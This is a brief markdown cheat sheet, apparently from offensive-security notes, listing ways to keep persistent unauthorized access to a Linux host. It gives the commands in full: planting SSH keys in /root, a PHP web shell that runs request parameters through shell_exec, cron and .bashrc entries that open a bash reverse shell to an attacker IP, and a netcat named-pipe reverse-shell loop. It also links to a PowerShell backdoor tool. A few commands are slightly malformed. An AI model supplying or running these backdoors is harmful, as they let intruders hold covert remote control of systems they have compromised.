[back](/README.md)
# ssh backdoor

The ssh backdoor essentially consists of leaving our ssh keys in some user’s home directory.

1. generate ssh-keygen
```
ssh-keygen
```
2. go to /root.ssh and leave our public key there with name `authorized_keys`

---
# php backdoor

1. put php code inside /var/www/html as file shell.php
```
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

2. go to link http://[ip[/shell.php and execute command:

```
http://<ip>/shell.php?cmd=id
```

---
# cron job backdoor

1. create reverse_shell.sh
```
cat > reverse_shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/<your ip>/4444 0>&1
```
2. add reverse_shell.sh to execute every minute
```
echo "* * * * * root /path/to/reverse_shell.sh >> /etc/crontab
```

---
# bashrc backdoor

```
echo 'bash -i >& /dev/tcp/<your ip>/4444 0>&1' >> ~/.bashrc
```
every time user logs in, reverse_shell gets executed

---
# Reverse Shell Bash Loop

while true; do sleep 5 && mknod /dev/shm/p p; cat /dev/shm/p | /bin/bash -i | nc 127.0.0.1 9001 >/dev/shm/p; done

# links
- [powershell backdoor tool](https://github.com/ELMERIKH/Keres)